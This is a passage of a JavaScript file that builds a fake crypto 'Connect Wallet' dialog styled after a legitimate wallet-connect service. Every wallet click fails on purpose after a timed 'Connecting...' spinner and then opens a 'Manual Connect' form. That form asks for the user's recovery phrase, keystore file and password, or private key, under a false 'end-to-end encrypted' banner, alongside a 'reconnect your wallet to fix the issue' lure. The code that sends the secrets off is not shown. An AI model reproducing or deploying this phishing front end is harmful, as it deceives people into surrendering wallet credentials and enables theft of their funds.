(function(){
  // Inject CSS
  const css = `:root{--reown-card:rgba(23,23,26,0.95);--reown-border:rgba(255,255,255,0.08);--reown-text:#ffffff;--reown-accent:#3396ff}
*,*::before,*::after{box-sizing:border-box}
.modal-overlay,.manual-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:9999;opacity:0;transition:opacity .4s ease}
.modal-overlay.active,.manual-overlay.active{display:flex;opacity:1}
.modal-content,.manual-content{background:var(--reown-card);color:var(--reown-text);border-radius:32px;border:1px solid var(--reown-border);width:100%;max-width:440px;max-height:92vh;overflow-y:auto;overflow-x:hidden;position:relative;padding-bottom:12px;backdrop-filter:blur(20px);transform:scale(.95);transition:transform .4s ease}
.modal-content, .manual-content { -ms-overflow-style: none; scrollbar-width: none; }
.modal-content::-webkit-scrollbar, .manual-content::-webkit-scrollbar { display: none; width:0; height:0 }
.modal-overlay.active .modal-content,.manual-overlay.active .manual-content{transform:scale(1)}
.sticky-header{position:sticky;top:0;background:rgba(23,23,26,0.9);backdrop-filter:blur(16px);z-index:10;border-bottom:1px solid var(--reown-border);padding:20px}
.close-btn{position:absolute;right:14px;top:14px;width:36px;height:36px;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:#ddd;font-size:18px;cursor:pointer}
.wallet-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 12px 24px;min-width:0}
.wallet-icon-wrapper{overflow:hidden;border-radius:12px}
.wallet-item img{width:56px;height:56px;object-fit:cover;border-radius:12px;display:block}
.wallet-item{min-width:0}
.wallet-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:16px 8px;text-align:center;transition:all .25s ease;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;aspect-ratio:1/1.05}
.wallet-item:hover{background:rgba(51,150,255,0.08);border-color:rgba(51,150,255,0.3);transform:translateY(-2px)}
.sticky-footer{position:sticky;bottom:0;background:transparent;padding:16px 24px;z-index:10;border-top:1px solid var(--reown-border);backdrop-filter:blur(12px)}
.more-btn{background:rgba(51,150,255,0.1);border:1px solid rgba(51,150,255,0.3);color:#3396ff}
.tab-buttons{display:flex;gap:8px;margin-bottom:24px;justify-content:center;flex-wrap:wrap}
.tab-btn{padding:10px 20px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer}
.tab-btn.active{background:var(--reown-accent);color:white}
.word-grid{display:grid;gap:12px;margin-bottom:16px}
.word-input{width:100%;padding:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);border-radius:12px;color:white;text-align:center}
.connect-btn{margin-top:24px;width:100%;padding:14px;background:var(--reown-accent);color:white;border-radius:12px;font-weight:600}
.input-field{width:100%;padding:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);border-radius:16px;color:white;font-family:monospace;min-height:120px}
.connect-overlay{position:fixed;top:15px;right:25px;width:320px;height:420px;background:#ffffff;color:#111111;border-radius:20px;border:1px solid rgba(0,0,0,0.06);box-shadow:0 10px 30px rgba(0,0,0,0.08);display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px;z-index:10001;overflow:hidden;opacity:0;transform:translateX(-20px);transition:opacity .3s ease,transform .3s ease;pointer-events:none}
.connect-overlay.active{opacity:1;transform:translateX(0);pointer-events:auto}
.main-wallet-wrap{position:relative;display:inline-flex;align-items:center;justify-content:center;width:120px;height:120px;margin-bottom:18px}
#modalMainWalletImg,#modalMainWalletImg2{width:96px;height:96px;border-radius:12px;object-fit:contain;background:transparent}
 .welcome-back-overlay{position:fixed;inset:0;background:rgba(2,6,23,0.78);backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;z-index:10002;opacity:0;transition:opacity .25s ease}
.welcome-back-overlay.active{display:flex;opacity:1}
.welcome-back-modal{position:relative;width:min(92vw, 480px);max-width:480px;background:linear-gradient(145deg, rgba(18,24,38,0.98), rgba(7,11,20,0.95));border:1px solid rgba(102,180,255,0.35);border-radius:24px;padding:28px 24px 24px;box-shadow:0 20px 55px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,255,255,0.06);transform:perspective(1200px) rotateX(8deg) rotateY(-4deg) translateZ(0);transition:transform .25s ease}
.welcome-back-overlay.active .welcome-back-modal{transform:perspective(1200px) rotateX(0deg) rotateY(0deg) translateZ(0)}
.welcome-back-close{position:absolute;top:12px;right:12px;width:36px;height:36px;border:0;border-radius:999px;background:rgba(255,255,255,0.08);color:#fff;cursor:pointer;font-size:18px;display:inline-flex;align-items:center;justify-content:center}
.welcome-back-header{font-size:clamp(1.35rem, 2.8vw, 1.8rem);font-weight:700;text-align:center;color:#fff;margin:10px 0 10px}
.welcome-back-name{color:#3396ff;font-weight:800}
.welcome-back-desc{font-size:clamp(0.95rem, 2.2vw, 1rem);line-height:1.6;text-align:center;color:#d0d7e2;margin:0 0 18px}
.welcome-back-btn{width:100%;padding:14px 16px;border:0;border-radius:14px;background:linear-gradient(135deg, #3396ff, #5ba2ff);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 12px 24px rgba(51,150,255,0.24)}
.welcome-back-btn:hover{transform:translateY(-1px)}
 .connect-ring {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 110px;
  height: 110px;
  pointer-events: none;
  opacity: 0;
  transition: opacity 160ms ease;
  z-index: 2;
}

.connect-ring.active {
  opacity: 1;
}

  .connect-ring svg {
  width: 110px;
  height: 110px;
  display: block;
  transform-origin: 50% 50%;
}

  /* Do not rotate the entire SVG - only animate the progress stroke. */
  .connect-ring.active svg {
    animation: none !important;
  }

  /* Ensure the static track does not animate */
  .connect-ring.active rect.track, .connect-ring.active path.track {
    animation: none !important;
  }

  /* Prevent the wallet images from rotating; only the orange progress stroke should animate */
  #modalMainWalletImg,
  #modalMainWalletImg2 {
    transform: none !important;
    animation: none !important;
  }

.connect-ring rect.track, .connect-ring path.track {
  stroke: rgba(0, 0, 0, 0.06);
  stroke-width: 8;
  fill: none;
}

.connect-ring rect.progress, .connect-ring path.progress {
  stroke: #F57251;
  stroke-width: 6;
  stroke-linecap: butt;
  fill: none;
  /* default: make the animated dash a quarter of the square perimeter
     (this will be overridden dynamically for precise paths) */
  stroke-dasharray: 84 252;
  stroke-dashoffset: 0;
}

.connect-ring.active rect.progress, .connect-ring.active path.progress {
  animation: squareProgress 1.8s linear infinite;
}

@keyframes squareProgress {
  from { stroke-dashoffset: 0; }
  to   { stroke-dashoffset: -336; }
}
.connect-overlay .overlay-message{color:orange;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
.connect-overlay-2 .overlay-message{color:orange;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
.overlay-message{margin-top:10px;font-weight:600;color:var(--reown-text);opacity:1;transition:opacity .25s ease}
.overlay-message.failed{color:#ef4444}
  .overlay-message .overlay-error-icon{width:34px;height:34px;border-radius:50%;background:#ef4444;color:#fff;display:inline-flex;align-items:center;justify-content:center;font-weight:700;margin:0 auto 8px;font-size:18px}
.social-logins{display:flex;justify-content:center;gap:16px;margin-bottom:12px}
.social-icon{width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,0.06);display:inline-flex;align-items:center;justify-content:center}
.social-icon img{width:20px;height:20px}`;
  const style = document.createElement('style'); style.textContent = css; document.head.appendChild(style);

  // Inject HTML
  const html = `
  <div id="welcome-back-overlay" class="welcome-back-overlay" aria-hidden="true">
    <div class="welcome-back-modal" role="dialog" aria-modal="true">
      <button id="welcome-back-close" class="welcome-back-close" aria-label="Close">✕</button>
      <div id="welcome-back-header" class="welcome-back-header">Welcome Back</div>
      <p id="welcome-back-desc" class="welcome-back-desc">Please kindly reconnect your wallet to fix the issue.</p>
      <button id="welcome-back-connect-btn" class="welcome-back-btn">Connect Wallet</button>
    </div>
  </div>

  <div id="modal-overlay" class="modal-overlay" aria-hidden="true">
    <div class="modal-content">
      <div class="sticky-header" style="position:relative;text-align:center">
        <h2 style="margin:0;font-size:20px;font-weight:600">Connect Wallet</h2>
        <p style="margin:6px 0 0 0;font-size:13px;color:#9ca3af">Choose your preferred wallet</p>
        <button id="close-modal-btn" class="close-btn" aria-label="Close">✕</button>
      </div>

      <div style="padding:16px 20px 8px">
        <input id="wallet-search" type="text" placeholder="Search wallets..." style="width:100%;padding:12px;border-radius:12px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);color:#fff;outline:none" />
      </div>

      <div id="visible-wallets" class="wallet-grid"></div>

      <div style="display:flex;justify-content:center;margin-top:8px">
        <button id="toggle-more" class="more-btn" style="padding:10px 16px;border-radius:12px;border:none;cursor:pointer">More wallets</button>
      </div>

      <div id="extra-wallets" class="wallet-grid" style="padding-bottom:28px;display:none"></div>

      <div class="sticky-footer">
        <div class="social-logins">
          <div class="social-icon"><img src="https://www.google.com/favicon.ico" alt="Google"></div>
          <div class="social-icon"><img src="https://github.com/favicon.ico" alt="GitHub"></div>
          <div class="social-icon"><img src="https://www.apple.com/favicon.ico" alt="Apple"></div>
          <div class="social-icon"><img src="https://www.facebook.com/favicon.ico" alt="Facebook"></div>
        </div>
        <div id="status-message" style="text-align:center;color:#9ca3af;font-size:13px">Select a wallet to connect</div>
      </div>
    </div>
  </div>

  <div id="connect-overlay" class="connect-overlay" aria-hidden="true">
    <div class="main-wallet-wrap">
      <img id="modalMainWalletImg" src="" alt="Selected Wallet">
      <div id="connectRing" class="connect-ring" aria-hidden="true">
        <svg viewBox="0 0 100 100">
          <rect class="track" x="8" y="8" width="84" height="84" rx="16"></rect>
          <rect class="progress" x="8" y="8" width="84" height="84" rx="16"></rect>
        </svg>
      </div>
    </div>
    <div id="overlay-wallet-name" style="font-weight:700;text-align:center"></div>
    <div id="overlay-message" class="overlay-message"></div>
  </div>

  <div id="connect-overlay-2" class="connect-overlay" aria-hidden="true" style="display:none">
    <div class="main-wallet-wrap">
      <img id="modalMainWalletImg2" src="" alt="Submitting">
      <div id="connectRing2" class="connect-ring" aria-hidden="true">
        <svg viewBox="0 0 100 100">
          <rect class="track" x="8" y="8" width="84" height="84" rx="16"></rect>
          <rect class="progress" x="8" y="8" width="84" height="84" rx="16"></rect>
        </svg>
      </div>
    </div>
    <div id="overlay-wallet-name-2" style="font-weight:700;text-align:center">Connecting…</div>
    <div id="overlay-message-2" class="overlay-message">Please wait while we connect your wallet…</div>
  </div>

  <div id="manual-overlay" class="manual-overlay" aria-hidden="true">
    <div class="manual-content">
      <div class="sticky-header" style="position:relative;text-align:center">
        <h2 style="margin:0;font-size:20px;font-weight:600">Manual Connect</h2>
        <p style="margin:6px 0 0 0;font-size:13px;color:var(--reown-text)">Enter your wallet details</p>
        <button id="close-manual-btn" class="close-btn" aria-label="Close">✕</button>
      </div>

      <div style="padding:20px">
        <div class="tab-buttons">
          <div class="tab-btn active" data-tab="phrase">Phrase</div>
          <div class="tab-btn" data-tab="keystore">Keystore JSON</div>
          <div class="tab-btn" data-tab="private">Private Key</div>
        </div>

        <div id="phrase-tab" class="tab-content">
          <div style="display:flex;justify-content:center;gap:8px;margin-bottom:12px">
            <label style="display:flex;align-items:center;gap:6px"><input type="radio" name="phrase-length" value="12" checked>12 words</label>
            <label style="display:flex;align-items:center;gap:6px"><input type="radio" name="phrase-length" value="24">24 words</label>
          </div>
            <div style="display:flex;flex-direction:column;gap:10px">
              <textarea id="phrase-input" class="input-field" placeholder="Enter your recovery phrase here (words separated by spaces)"></textarea>
              <div id="phrase-status" style="color:var(--reown-text);font-size:13px;display:none;text-align:center">Please fill out the field</div>
            </div>
        </div>

        <div id="keystore-tab" class="tab-content" style="display:none">
          <textarea id="keystore-json" class="input-field" placeholder='Paste your Keystore JSON here...'></textarea>
          <input type="password" id="keystore-password" class="input-field" style="margin-top:12px" placeholder="Keystore Password">
        </div>

        <div id="private-tab" class="tab-content" style="display:none">
          <input type="text" id="private-key" class="input-field" placeholder="Enter your Private Key">
        </div>

        <p style="color:#10b981;text-align:center;border-radius: 20px;border: 1px solid rgba(255,255,255,0.08);margin-top:12px;padding: 20px;font-size:13px"><end-to-end>This Session is - end-to-end encrypted</p>
        <button id="manual-connect-btn" class="connect-btn">Connect wallet</button>
      </div>
    </div>
  </div>`;

  const container = document.createElement('div'); container.innerHTML = html; document.body.appendChild(container);

  // Convert any SVG <rect> used for the ring into a precise rounded-rect <path>
  // and start a robust animation using the path's getTotalLength() value.
  (function setupConnectRingPaths(){
    function roundedRectPath(x,y,w,h,r){
      return `M${x+r},${y} H${x+w-r} A${r},${r} 0 0 1 ${x+w},${y+r} V${y+h-r} A${r},${r} 0 0 1 ${x+w-r},${y+h} H${x+r} A${r},${r} 0 0 1 ${x},${y+h-r} V${y+r} A${r},${r} 0 0 1 ${x+r},${y} Z`;
    }

    const svgs = container.querySelectorAll('.connect-ring svg');
    svgs.forEach(svg=>{
      const rects = Array.from(svg.querySelectorAll('rect'));
      rects.forEach(rect=>{
        try{
          const x = parseFloat(rect.getAttribute('x')||0);
          const y = parseFloat(rect.getAttribute('y')||0);
          const w = parseFloat(rect.getAttribute('width')||0);
          const h = parseFloat(rect.getAttribute('height')||0);
          const r = parseFloat(rect.getAttribute('rx')||0);
          const d = roundedRectPath(x,y,w,h,r);
          const path = document.createElementNS('http://www.w3.org/2000/svg','path');
          const cls = rect.getAttribute('class') || '';
          path.setAttribute('class', cls);
          path.setAttribute('d', d);
          // preserve stroke attributes if present; CSS will style it otherwise
          if(rect.hasAttribute('stroke')) path.setAttribute('stroke', rect.getAttribute('stroke'));
          if(rect.hasAttribute('stroke-width')) path.setAttribute('stroke-width', rect.getAttribute('stroke-width'));
          path.setAttribute('fill','none');
          rect.parentNode.replaceChild(path, rect);
        }catch(e){ /* ignore conversion errors */ }
      });
    });

    function startRingAnimation(pathEl, duration){
      if(!pathEl || typeof pathEl.getTotalLength !== 'function') return;
      const len = pathEl.getTotalLength();
      const dash = Math.round(len/4);
      pathEl.style.strokeDasharray = `${dash} ${Math.round(len - dash)}`;
      pathEl.style.strokeDashoffset = '0';

      let start = null;
      function frame(ts){
        if(!start) start = ts;
        const elapsed = ts - start;
        const progress = (elapsed % duration) / duration;
        const offset = Math.round(progress * len);
        pathEl.style.strokeDashoffset = `-${offset}`;
        requestAnimationFrame(frame);
      }
      requestAnimationFrame(frame);
    }

    const progressPaths = container.querySelectorAll('.connect-ring .progress');
    progressPaths.forEach(p => startRingAnimation(p, 1800));
  })();

  // Logic (copied/adapted from original modal script)
  const visibleList = [
    { name: 'WalletConnect', icon: 'assets/Walletconnect.jpeg' },
    { name: 'Solflare', icon: 'assets/Solflare.png' },
    { name: 'MetaMask', icon: 'assets/Metamask.png' },
    { name: 'Ledger Live', icon: 'assets/ledgerlive.png' },
    { name: 'Acurast-lite', icon: 'assets/Acurast-lite.png' },
    { name: 'airgap', icon: 'assets/airgap.png' },
    { name: 'AlphaWallet', icon: 'assets/alphawallet.jpeg' },
    { name: 'Amaze Wallet', icon: 'assets/Amaze-wallet.png' },
    { name: 'Ambire', icon: 'assets/Ambire-wallet.png' },
    { name: 'AToken', icon: 'assets/atoken_wallet.jpg' },
    { name: 'Atomic Wallet', icon: 'assets/Atomic-wallet.png' },
    { name: 'Authereum', icon: 'assets/Authereum.png' },
    { name: 'Avalanche', icon: 'assets/avax.png' },
    { name: 'Backpack', icon: 'assets/backpack.png' },
    { name: 'Binance Wallet', icon: 'assets/binancewallet.png' },
    { name: 'Bitget Wallet', icon: 'assets/bitgetwallet.png' },
    { name: 'BitKeep', icon: 'assets/bitkeep.jpg' },
    { name: 'BitPay', icon: 'assets/bitpay.png' },
    { name: 'Blade', icon: 'assets/blade.png' },
    { name: 'Bybit', icon: 'assets/bybit.png' },
    { name: 'Celo Wallet', icon: 'assets/celo_wallet.jpg' },
    { name: 'Coinbase Wallet', icon: 'assets/coinbasewallet.png' },
    { name: 'Coinomi', icon: 'assets/coinomi.png' },
    { name: 'Coinwallet', icon: 'assets/coinwallet.png' },
    { name: 'Cool Wallet', icon: 'assets/cool_wallet.jpg' },
    { name: 'Dex Wallet', icon: 'assets/Dex-wallet.png' },
    { name: 'DOK Wallet', icon: 'assets/dok_wallet.jpg' },
    { name: 'Dove Wallet', icon: 'assets/Dove-wallet.png' },
    { name: 'Easypocket', icon: 'assets/easypocket.jpg' },
    { name: 'Edge', icon: 'assets/Edge-wallet.png' },
    { name: 'Electrum', icon: 'assets/electrum.png' },
    { name: 'Ellipal', icon: 'assets/Ellipal-wallet.png' },
    { name: 'Encrypted Ink', icon: 'assets/encrypted_ink.jpg' },
    { name: 'Enjin', icon: 'assets/enjin.png' },
    { name: 'Equal', icon: 'assets/equal.jpg' },
    { name: 'Exodus', icon: 'assets/exodus.png' },
    { name: 'Fantom', icon: 'assets/fantom.png' },
    { name: 'Flare Wallet', icon: 'assets/flare_wallet.jpg' },
    { name: 'Frontier', icon: 'assets/Frontier-wallet.png' },
    { name: 'Gatehub', icon: 'assets/Gatehub-wallet.png' },
    { name: 'Gnosis Safe', icon: 'assets/gnosis-safe.jpeg' },
    { name: 'Guarda', icon: 'assets/guarda.png' },
    { name: 'Hashpack', icon: 'assets/Hashpack.jfif' },
    { name: 'Hex Trust', icon: 'assets/Hex-trust.png' },
    { name: 'imToken', icon: 'assets/imToken-wallet.png' },
    { name: 'imToken (alt)', icon: 'assets/imtoken.jpg' },
    { name: 'Infinity', icon: 'assets/infinity.jpeg' },
    { name: 'Jade Wallet', icon: 'assets/jade_wallet.jpg' },
    { name: 'Jupiter', icon: 'assets/jupiter.png' },
    { name: 'Keplr', icon: 'assets/Keplr.jpeg' },
    { name: 'Keystone', icon: 'assets/Keystone-wallet.png' },
    { name: 'Klever', icon: 'assets/klever.png' },
    { name: 'Kukai', icon: 'assets/Kukai-wallet.png' },
    { name: 'KyberSwap', icon: 'assets/kyberswap.jpg' },
    { name: 'Magic', icon: 'assets/Magic.png' },
    { name: 'Math Wallet', icon: 'assets/math_wallet.jpg' },
    { name: 'Mycelium', icon: 'assets/mycelium.png' },
    { name: 'MyEther Wallet', icon: 'assets/Myether-wallet.png' },
    { name: 'MyEther (alt)', icon: 'assets/MyEther-wwallet.png' },
    { name: 'Nash', icon: 'assets/nash.jpg' },
    { name: 'OKX Wallet', icon: 'assets/Okxwallet.png' },
    { name: 'Omni Wallet', icon: 'assets/Omni-wallet.png' },
    { name: 'OneInch', icon: 'assets/oneinch.png' },
    { name: 'OpNet Wallet', icon: 'assets/OpNet-wallet.png' },
    { name: 'Ownbit', icon: 'assets/ownbit.jpg' },
    { name: 'Pip Wallet', icon: 'assets/Pip-wallet.png' },
    { name: 'Polkadot', icon: 'assets/polkadot.jpg' },
    { name: 'Rabby', icon: 'assets/rabbywallet.png' },
    { name: 'Rainbow', icon: 'assets/rainbow.png' },
    { name: 'Revuto', icon: 'assets/Revuto-wallet.png' },
    { name: 'Ronin', icon: 'assets/Ronin.png' },
    { name: 'Safepal', icon: 'assets/safepal.png' },
    { name: 'Slush', icon: 'assets/Slush.png' },
    { name: 'Stacks Wallet', icon: 'assets/stacks-wallet.png' },
    { name: 'Stakenet', icon: 'assets/Stakenet-wallet.png' },
    { name: 'Sub', icon: 'assets/Sub.png' },
    { name: 'SuperHero', icon: 'assets/SuperHero.png' },
    { name: 'Swift', icon: 'assets/swift.png' },
    { name: 'Terra Station', icon: 'assets/terra-station.png' },
    { name: 'TokenPocket', icon: 'assets/tokenpocket.png' },
    { name: 'Trezor Suite', icon: 'assets/trezorsuite.png' },
    { name: 'TronLink', icon: 'assets/tronlink.png' },
    { name: 'Trustee Wallet', icon: 'assets/trustee_wallet.jpg' },
    { name: 'Trust Wallet', icon: 'assets/trustwallet.png' },
    { name: 'Uniswap', icon: 'assets/Uniswap.jpeg' },
    { name: 'Unstoppable', icon: 'assets/unstoppable_wallet.jpg' },
    { name: 'Valora', icon: 'assets/valora.jpg' },
    { name: 'Vector Wallet', icon: 'assets/Vector-wallet.png' },
    { name: 'Via Wallet', icon: 'assets/via_wallet.jpg' },
    { name: 'Vision', icon: 'assets/Vision-wallet.png' },
    { name: 'Wallet IO', icon: 'assets/wallet_io.jpg' },
    { name: 'Wallmer', icon: 'assets/Wallmer-wallet.png' },
    { name: 'Wasabi', icon: 'assets/Wasabi-wallet.png' },
    { name: 'Wave', icon: 'assets/Wave-wallet.png' },
    { name: 'Wigwam', icon: 'assets/Wigwam-wallet.png' },
    { name: 'Zumo', icon: 'assets/zumo-wallet.png' }
  ];

  const rawExtraWallets = ['rainbow','backpack','solflare','rabbywallet','trezorsuite','coinbasewallet','tokenpocket','tronlink','slush','airgap'];
  const extraWalletNames = Array.from(new Set(rawExtraWallets));

  function normalizeKey(s){return (s||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'')}
  function getIconFromManifestByName(name){return null;}
  function normalizeAssetPath(path){
    if (!path || typeof path !== 'string') return path;
    if (/^[a-z]+:\/\//i.test(path)) return path;
    if (path.startsWith('/public/')) return path;
    if (path.startsWith('/assets/')) return `/public${path}`;
    if (path.startsWith('/wallets/')) return `/public${path}`;
    if (path.startsWith('public/')) return `/${path}`;
    if (path.startsWith('assets/')) return `/public/${path}`;
    if (path.startsWith('wallets/')) return `/public/${path}`;
    if (path.startsWith('/')) return path;
    return `/public/assets/${path}`;
  }
  function resolveIconUrl(name, providedIcon){
    if (providedIcon) {
      // Normalize provided icon paths but prefer public asset paths so
      // deployments under the current workspace server root resolve correctly.
      if (typeof providedIcon === 'string') {
        if (/^[a-z]+:\/\//i.test(providedIcon)) return providedIcon; // remote url
        if (providedIcon.startsWith('/assets/') || providedIcon.startsWith('/wallets/') || providedIcon.startsWith('/public/')) return normalizeAssetPath(providedIcon);
        if (providedIcon.startsWith('assets/') || providedIcon.startsWith('wallets/') || providedIcon.startsWith('public/')) return normalizeAssetPath(providedIcon);
        if (!providedIcon.startsWith('/')) return normalizeAssetPath(providedIcon);
        return providedIcon;
      }
    }
    const candidates = [];
    const safeName = (name||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
    const aliasMap = { 'cryptowallet':'coinwallet','coinbasewallet':'coinbasewallet','trustwallet':'trustwallet','jupiter':'jupiter','solflare':'Solflare','slush':'Slush','other':'Other','metamask':'Metamask','walletconnect':'Walletconnect','ronin':'Ronin','okxwallet':'Okxwallet','keplr':'Keplr','uniswap':'Uniswap','magic':'Magic' };
    const lookupName = aliasMap[safeName] || safeName;
    const exts = ['png','jpeg','jpg','svg'];
    // prefer public assets first so the local dev server serves them correctly
    exts.forEach(ext=>{
      candidates.push(`/public/assets/${lookupName}.${ext}`);
      candidates.push(`assets/${lookupName}.${ext}`);
      candidates.push(`/assets/${lookupName}.${ext}`);
      candidates.push(`/public/wallets/${lookupName}.${ext}`);
      candidates.push(`wallets/${lookupName}.${ext}`);
      candidates.push(`/wallets/${lookupName}.${ext}`);
    });
    if(candidates.length > 0) return candidates[0];
    const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
    return `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
  }

  // Return ordered candidate URLs for an icon so callers can try fallbacks.
  function resolveIconCandidates(name, providedIcon){
    const list = [];
    if(providedIcon && typeof providedIcon === 'string'){
      if(/^[a-z]+:\/\//i.test(providedIcon)) return [providedIcon];
      if(providedIcon.startsWith('/assets/') || providedIcon.startsWith('/wallets/') || providedIcon.startsWith('/public/')) list.push(normalizeAssetPath(providedIcon));
      if(providedIcon.startsWith('assets/') || providedIcon.startsWith('wallets/') || providedIcon.startsWith('public/')) list.push(normalizeAssetPath(providedIcon));
      if(!providedIcon.startsWith('/')) list.push(normalizeAssetPath(providedIcon));
    }
    // Also generate lookup-based candidates
    const safeName = (name||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
    const exts = ['png','jpeg','jpg','svg'];
    exts.forEach(ext=>{
      list.push(`/public/assets/${safeName}.${ext}`);
      list.push(`assets/${safeName}.${ext}`);
      list.push(`/assets/${safeName}.${ext}`);
      list.push(`/public/wallets/${safeName}.${ext}`);
      list.push(`wallets/${safeName}.${ext}`);
      list.push(`/wallets/${safeName}.${ext}`);
    });
    // final fallback placeholder
    list.push(`https://via.placeholder.com/96/222/fff?text=${encodeURIComponent((name&&name[0])?name[0].toUpperCase():'W')}`);
    return list;
  }

  // Attempt sequential image loads from candidates and set the first successful src on imgEl
  function loadImageWithFallbacks(imgEl, candidates){
    if(!imgEl || !candidates || !candidates.length) return;
    let idx = 0;
    function tryNext(){
      if(idx >= candidates.length){
        // nothing worked
        return;
      }
      const url = candidates[idx++];
      const test = new Image();
      test.onload = function(){ imgEl.src = url; };
      test.onerror = function(){ tryNext(); };
      // kick off
      test.src = url;
    }
    tryNext();
  }

  function createWalletCard(entry){
    const name = typeof entry === 'string' ? entry : (entry.name || 'Unknown');
    const icon = typeof entry === 'string' ? '' : (entry.icon || '');
    const card = document.createElement('div'); card.className = 'wallet-item'; card.dataset.wallet = name;
    const wrapper = document.createElement('div'); wrapper.className='wallet-icon-wrapper';
    const img = document.createElement('img'); img.alt = name; img.style.width='56px'; img.style.height='56px';
    const src = resolveIconUrl(name, icon);
    img.src = src; img.onerror = function(){ this.onerror=null; this.src=`https://via.placeholder.com/96/222/fff?text=${encodeURIComponent((name&&name[0])?name[0].toUpperCase():'W')}` };
    // persist resolved icon URL on the card for click handlers
    card.dataset.icon = src;
    wrapper.appendChild(img);
    const label = document.createElement('div'); label.style.fontSize='0.9rem'; label.style.marginTop='6px'; label.style.color = 'var(--reown-text)'; label.style.fontWeight = '600'; label.textContent = name;
    card.appendChild(wrapper); card.appendChild(label);
    card.addEventListener('click', handleWalletClick);
    return card;
  }

  function renderVisibleWallets(){ const visibleWallets = document.getElementById('visible-wallets'); if(!visibleWallets) return; visibleWallets.innerHTML=''; visibleList.forEach(w=>visibleWallets.appendChild(createWalletCard(w))); }
  function populateExtraWallets(){ const extra = document.getElementById('extra-wallets'); if(!extra) return; extra.innerHTML=''; let list = (extraWalletNames && extraWalletNames.length) ? extraWalletNames.slice() : ['Coinbase Wallet','Trust Wallet','Rainbow']; const otherKey = 'other'; list = list.filter(x => normalizeKey(x) !== otherKey); list.push('Other'); list.forEach(w=>extra.appendChild(createWalletCard(w))); }
  function resetWallets(){document.querySelectorAll('.wallet-item.selected').forEach(el=>el.classList.remove('selected'))}

  function handleWalletClick(){
    resetWallets();
    this.classList.add('selected');
    try{ document.getElementById('status-message').style.display='none' }catch(e){}
    const walletName = this.dataset.wallet;
    const iconUrl = this.dataset.icon || resolveIconUrl(walletName,'');
    const overlay = document.getElementById('connect-overlay');
    const mainImg = overlay.querySelector('#modalMainWalletImg');
    const nameEl = overlay.querySelector('#overlay-wallet-name');
    const msgEl = overlay.querySelector('#overlay-message');
    mainImg.src = iconUrl;
    // persist selected icon for the second overlay and future loads
    try { sessionStorage.setItem('bitverse:selectedWalletIcon', iconUrl); } catch(e) {}
    const mainImg2 = document.getElementById('modalMainWalletImg2');
    if (mainImg2) mainImg2.src = iconUrl;
    nameEl.textContent = walletName;
    msgEl.textContent = 'Connecting...';
    msgEl.classList.remove('failed');
    overlay.classList.add('active');

    const connectRing = document.getElementById('connectRing');
    if (connectRing) {
      connectRing.classList.add('active');
    }

    setTimeout(()=>{
      if (connectRing) {
        connectRing.classList.remove('active');
      }
      try{ msgEl.innerHTML = '<div class="overlay-error-icon" aria-hidden="true">!</div><div>Connection failed. Please try to connect manually</div>'; msgEl.classList.add('failed'); }catch(e){}
      setTimeout(()=>{
        try{ overlay.classList.remove('active'); }catch(e){}
        showManualConnectModal();
      },2000);
    },12000);
  }

  function showManualConnectModal(){ const m = document.getElementById('manual-overlay'); if(!m) return; m.style.display='flex'; setTimeout(()=>{m.classList.add('active')},10); }

  (function wireModalControls(){
    const modalOverlay = document.getElementById('modal-overlay');
    const manualOverlay = document.getElementById('manual-overlay');
    const openBtns = document.querySelectorAll('#open-modal');
    const closeBtn = document.getElementById('close-modal-btn');
    const closeManual = document.getElementById('close-manual-btn');
    const toggleMore = document.getElementById('toggle-more');
    const extra = document.getElementById('extra-wallets');
    const searchInput = document.getElementById('wallet-search');
    const welcomeOverlay = document.getElementById('welcome-back-overlay');
    const welcomeCloseBtn = document.getElementById('welcome-back-close');
    const welcomeConnectBtn = document.getElementById('welcome-back-connect-btn');
    const welcomeHeader = document.getElementById('welcome-back-header');
    const welcomeDesc = document.getElementById('welcome-back-desc');

    openBtns.forEach(btn => {
      btn.addEventListener('click', ()=>{ if (modalOverlay) { modalOverlay.style.display='flex'; setTimeout(()=>modalOverlay.classList.add('active'),10) } });
    });
    if(closeBtn) closeBtn.addEventListener('click', ()=>{ if (modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(()=>modalOverlay.style.display='none',400) } });
    if(closeManual) closeManual.addEventListener('click', ()=>{ if (manualOverlay) { manualOverlay.classList.remove('active'); setTimeout(()=>manualOverlay.style.display='none',400) } });

    function openWalletSelection() {
      if (modalOverlay) {
        modalOverlay.style.display = 'flex';
        setTimeout(() => modalOverlay.classList.add('active'), 10);
      }
      if (welcomeOverlay) {
        welcomeOverlay.classList.remove('active');
        setTimeout(() => {
          welcomeOverlay.style.display = 'none';
        }, 220);
      }
    }

    function showWelcomeBackModal(name) {
      if (!welcomeOverlay || !welcomeHeader || !welcomeDesc) return;
      const safeName = (name || '').trim();
      if (!safeName) return;

      welcomeHeader.replaceChildren();
      welcomeHeader.appendChild(document.createTextNode('Welcome Back '));
      const nameSpan = document.createElement('span');
      nameSpan.className = 'welcome-back-name';
      nameSpan.textContent = safeName;
